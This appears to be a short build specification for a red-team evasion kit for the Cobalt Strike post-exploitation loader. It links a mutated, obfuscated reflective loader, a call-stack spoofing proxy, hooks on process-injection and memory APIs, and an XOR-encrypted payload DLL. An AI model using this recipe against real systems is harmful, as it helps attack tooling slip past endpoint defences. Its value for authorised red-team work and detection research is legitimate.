name     "Crystal Kit Postex UDRL"
describe "Evasion Kit for Cobalt Strike"
author   "Daniel Duggan (@_RastaMouse)"

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize +disco +mutate
		patch "pGetModuleHandle" $GMH
		patch "pGetProcAddress"  $GPA
		dfr "resolve" "strings"
		mergelib "../libtcg.x64.zip"
		mergelib "../libtp.x64.zip"
	
	load "bin/proxy.x64.o"
		make pic
		export
		preplen
		link "draugr"

	generate $KEY 128

	load "bin/hook.x64.o"
		make object +optimize +disco
		mergelib "../libtcg.x64.zip"
		import "LoadLibraryA, GetProcAddress, SpoofStub, LoadLibraryW, LoadLibraryExW, VirtualAlloc, VirtualAllocEx, VirtualProtect, VirtualProtectEx, VirtualFree, VirtualQuery, GetThreadContext, SetThreadContext, ResumeThread, CreateThread, CreateRemoteThread, OpenProcess, OpenThread, ExitThread, CloseHandle, Sleep, CreateFileMappingA, MapViewOfFile, UnmapViewOfFile, DuplicateHandle, ReadProcessMemory, WriteProcessMemory, CreateProcessA"
		export
		link "hooks"

	push $DLL
		xor $KEY
		preplen
		link "dll"

	push $KEY
		preplen
		link "key"
	
	export
